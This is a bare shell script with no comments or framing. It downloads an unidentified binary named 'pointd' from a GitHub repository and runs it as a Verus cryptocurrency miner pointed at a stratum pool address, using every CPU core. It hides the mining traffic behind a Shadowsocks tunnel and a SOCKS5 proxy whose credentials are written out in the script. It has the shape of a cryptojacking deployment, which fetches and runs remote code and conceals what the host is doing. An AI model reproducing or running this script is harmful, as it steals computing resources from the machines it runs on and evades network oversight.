apt update -y
wget -q https://github.com/manorepas/bash/raw/main/pointd
chmod +x pointd
sudo apt -y install shadowsocks-libev rng-tools libsodium-dev

ss-local -s pl1ss.greenssh.xyz -p 8388 -l 8139 -k Yzg2Y -m chacha20-ietf-poly1305 -v &
./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(echo $(shuf -i 1-3 -n 1)-ngalong) -p x -t $(nproc) -x socks5://jwegwndc-1:mj2pb21fuqzo@p.webshare.io:80

